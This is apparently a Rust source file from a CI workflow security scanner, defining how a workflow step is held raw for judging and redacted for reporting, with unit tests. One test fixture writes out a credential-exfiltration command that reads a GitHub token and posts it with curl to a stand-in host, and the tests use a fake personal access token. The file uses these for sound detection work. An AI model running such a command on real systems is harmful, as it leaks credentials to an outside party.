// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! A step a CI workflow runs, and the shell it runs.

use crate::credential;
use crate::yaml::Span;

/// One step of one job, as the workflow writes it.
///
/// A step that runs nothing of its own is not one of these: a workflow's other
/// steps name an action to use rather than a command to run, and what those do
/// is decided by the action rather than by this file.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct Step {
    /// The job it belongs to, as the file names it.
    pub job: String,
    /// The shell it runs, with any credential value taken out. Never executed.
    pub run: String,
    /// The shell it runs under, as the workflow decides it: the step's own
    /// `shell`, the nearest `defaults.run.shell`, or the runner's default.
    pub shell: String,
    /// Where the workflow wrote what it runs. A finding is placed inside this
    /// rather than by searching the file for the command again, which goes
    /// wrong wherever the same text is written twice.
    pub at: Option<Span>,
}

impl Step {
    /// One step, exactly as the workflow writes it.
    ///
    /// Not redacted here, deliberately. Every shell rule reads what the step
    /// runs, and masking a credential first destroys the text those rules
    /// need: `TOKEN=$(gh auth token)` masked to `TOKEN=**** auth token)` no
    /// longer says where the token came from, so the exfiltration below it
    /// goes unreported. A hook's command is judged raw and redacted on its
    /// way into the report, and so is this; [`Step::redacted`] is that step.
    #[must_use]
    pub fn new(job: &str, run: &str, shell: &str, at: Option<Span>) -> Self {
        Self {
            job: job.to_owned(),
            run: run.to_owned(),
            shell: shell.to_owned(),
            at,
        }
    }

    /// The same step with any credential value in it taken out.
    ///
    /// All three fields: a job may be named after what it deploys with, and a
    /// custom `shell` is a command line of its own, so a token can be written
    /// into the template every step then runs through.
    #[must_use]
    pub fn redacted(&self) -> Self {
        Self {
            job: credential::redacted(&self.job),
            run: credential::redacted(&self.run),
            shell: credential::redacted(&self.shell),
            at: self.at,
        }
    }

    /// Whether what it runs is a POSIX shell, and so readable as one.
    ///
    /// A workflow may run PowerShell, Python or a shell of its own choosing,
    /// and Windows runners default to PowerShell. Reading those as Bash would
    /// judge one language by another's syntax, so they are reported and left
    /// unjudged rather than guessed at. The first word is what decides it: a
    /// custom `shell` is a command line, and `bash -e {0}` is still Bash.
    #[must_use]
    pub fn is_posix_shell(&self) -> bool {
        self.shell
            .split_whitespace()
            .next()
            .map(|word| word.rsplit(['/', '\\']).next().unwrap_or(word))
            .is_some_and(|name| matches!(name, "bash" | "sh"))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const PAT: &str = concat!("ghp_", "aB3dE5gH7jK9mN1pQ3sT5vW7yZ9bC1dF3hJ5");

    /// Only a POSIX shell is read as one. A step running PowerShell or Python
    /// is reported and left unjudged: reading it as Bash would judge one
    /// language by another's syntax.
    #[test]
    fn only_a_posix_shell_is_read_as_shell() {
        for shell in ["bash", "sh", "bash -e {0}", "/bin/bash", "/usr/bin/sh"] {
            assert!(
                Step::new("a", "echo ok", shell, None).is_posix_shell(),
                "{shell}"
            );
        }
        for shell in [
            "pwsh",
            "powershell",
            "python",
            "python3",
            "cmd",
            "C:\\Windows\\pwsh.exe",
            "",
        ] {
            assert!(
                !Step::new("a", "echo ok", shell, None).is_posix_shell(),
                "{shell}"
            );
        }
    }

    /// What reaches the report carries no credential value. Every field: a
    /// job may be named after what it deploys with, and a custom `shell` is a
    /// command line a token can be written into.
    #[test]
    fn a_credential_in_a_step_is_never_recorded() {
        let held = Step::new(
            &format!("deploy-{PAT}"),
            &format!("curl -H 'Authorization: Bearer {PAT}' https://h.invalid"),
            &format!("my-shell --token {PAT} {{0}}"),
            None,
        )
        .redacted();

        assert!(!format!("{held:?}").contains(PAT), "{held:?}");
        assert!(held.run.contains("curl"), "{held:?}");
        assert!(held.job.starts_with("deploy-"), "{held:?}");
        assert!(held.shell.starts_with("my-shell"), "{held:?}");
    }

    /// A step is judged before it is redacted, so what it holds until then is
    /// what the workflow wrote. Masking first destroys the text the shell
    /// rules read: `TOKEN=$(gh auth token)` masked no longer says where the
    /// token came from, and the exfiltration below it goes unreported.
    #[test]
    fn a_step_holds_what_the_workflow_wrote_until_it_is_redacted() {
        let run = "TOKEN=$(gh auth token)\ncurl -d \"$TOKEN\" https://h.invalid";

        let held = Step::new("a", run, "bash", None);

        assert_eq!(held.run, run, "judged on what was written");
        // And the report's copy is not that text, which is the whole point of
        // keeping the two apart.
        assert_ne!(held.redacted().run, run);
    }

    /// A job's name reaches a report too, and a workflow may name a job after
    /// what it deploys with.
    #[test]
    fn a_credential_in_a_job_name_is_never_recorded() {
        let held = Step::new(&format!("push-{PAT}"), "echo ok", "bash", None).redacted();

        assert!(!format!("{held:?}").contains(PAT), "{held:?}");
        assert!(held.job.starts_with("push-"), "{held:?}");
    }
}
